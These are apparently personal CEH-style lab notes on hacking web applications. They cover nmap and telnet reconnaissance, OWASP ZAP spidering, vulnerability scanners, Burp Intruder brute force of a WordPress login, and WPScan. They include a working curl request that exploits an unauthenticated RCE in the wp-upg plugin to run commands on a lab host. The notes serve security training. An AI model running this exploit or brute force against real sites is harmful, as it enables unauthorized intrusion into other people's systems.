# Hacking Web Applications

on any website / web application, before we attempt any attack
we do enumeration (information gathering)
using various tools such as
- Netcraft - https://www.netcraft.com
- SmartWhois - https://www.tamos.com
- WHOIS lookup - https://whois.domaintools.com
- Batch IP converter - http://www.sabsoft.com
also we need to perform DNS enumeration on the target, for that we use tools such as
- [[DNSRecon]]
- Domain Dossier - https://centralops.net

## Footprinting the Web Infrastructure

### initial Recon and enumeration

using [[Nmap]] and [[Telnet]]

```bash
nmap -T4 -A -v <target-domain>
```
> *here `www.moviescope.com`*
> -T4 = time template (1-5) 
> -A = aggressive
> -v = verbose

→ displaying the open port and services running on the machine hosting the target website
→ as we scroll down we can also see details such as
> - target machine name
> - NETBios name
> - DNS name
> - MAC address
> - OS etc.


→ next we perform banner grabbing to identify
> - the make
> - the model
> - version
> - content - type etc.

→ and for this we use [[Telnet]]
→ just like we did before

```bash
telnet <target-domain> 80
```
→ and then
```h
GET / HTTP/1.0
```

→ we discover that server is **Microsoft-IIS/10.0** and uses **ASP.NET**

---
### web spidering

tool used
#### [[OWASP ZAP]]

open OWASP ZAP
search via menu
OR
```bash
zaproxy
```

→ after launch
→ select the **NO** option and enter the **Welcome to OWASP ZAP** 
→ we'll select the **Automated scan**
→ enter the Target URL and press **Attack**
→ after the scan is complete the **Alerts** tab will open
> this page summarizes the vulnerabilities found during the scan

→ switch to the **Spider** tab
> all the URLs that were found during the scan are under this tab

→ under the **Spider** tab, there's a **Messages** tab that shows more detailed information regarding the UIRLs obtained

---
### Web Application Vulnerability scanning

tool used
#### SmartScanner
#tool/windows #gui 

→ search `smartscanner` in the windows and open it
→ enter the target URL and select **scan**
→ all the issues found in the website will be listed, including the **severity** of the issue
→ we can expand the Issues and read more about them in details, including the references i.e. CWE etc.

#### other tools 

- WPScan Vulnerability Database - https://wpscan.com
- Codename SCNR - https://ecsypno.com
- AppSpider - https://www.rapid7.com
- uniscan
- N-Stalker - https://www.nstalker.com

---
## Perform Web Application Attacks

### perform brute force

tool used
#### [[BurpSuite]]

the admin panel of the Wordpress is notoriously famous for its username enum issue
in this we try to bruteforce the admin panel

for this add to your proxy
→ 127.0.0.1
→ port = 8080
→ and check for the **also use this for HTTPS**

or u can open the burp browser to perform the attack
perform the attack using intruder
look for any different **response code** or change in response **length**

---

### Perform RCE in a vulnerable WordPress plugin

tool used
#### [[WPScan]]

→ to use wpscan we need to create an account https://www.wpscan.com
→ copy the api token

```bash
wpscan --url <target-URl/IP> --api-token <api-token-copied> 
```

→ it'll scan the website for plugins and if they are vulnerable 
> *in lab* we see that we found a plugin **wp-upg** that has an **unauthenticated RCE**

→ to perform the attack
```bash
curl -i 'http://10.10.1.22:8080/CEH/wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:whoami:NULL:NULL'
```
> This curl command exploits a WordPress plugin vulnerability by sending a malicious request to the admin-`ajax.php` file, allowing an attacker to execute arbitrary system commands via the exec function, potentially leading to remote code execution.
> this way we execute the command `whoami` on the target

---
### Detecting Web Application using tools

tool used
#### [[Wapiti]]

> it is a web-application vulnerability scanner that scans for SQLi, XSS, and other vulnerabilities

```bash
cd wapiti
```
```bash
python3 -m venv wapiti3
```
```bash
. wapiti3/bin/activate
```
> this activates a virtual environment

```bash
pip install .
```
> this installs the wapiti web application scanner

```bash
wapiti -u <https://www.certifiedhacker.com>
```
*change the target accordingly*

→ after the scan is complete
```bash
cd /root/.wapiti/generated_report/
```

→ run `ls`to view the reports
> an .html file with the name of the website is created

open the file with firefox
```bash
firefox <filename>
```

→ watch and analyze the report

---